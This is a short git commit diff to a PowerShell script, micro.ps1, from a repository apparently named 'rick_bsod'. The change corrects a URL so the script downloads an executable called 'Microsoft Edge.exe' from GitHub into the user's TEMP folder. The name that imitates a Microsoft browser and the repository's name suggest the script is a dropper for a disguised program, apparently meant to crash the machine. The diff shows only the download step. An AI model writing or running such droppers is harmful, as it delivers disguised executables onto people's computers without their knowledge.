9fb4c7dbf3fd966bf34ccce4334e1a549b984243
discordl78-ops <discordl78@onet.pl>
2026-04-10 16:54:48 +0200

    Update micro.ps1

--- micro.ps1
+++ micro.ps1
@@ -1,5 +1,5 @@
-$url = "https://github.com/discordl78-ops/rick_bsod/blob/main/Microsoft%20Edge.exe"
-$outputPath = "$env:TEMP\Microsoft%20Edge.exe"
+$url = "https://github.com/discordl78-ops/rick_bsod/raw/refs/heads/main/Microsoft%20Edge.exe"
+$outputPath = "$env:TEMP\Microsoft Edge.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 
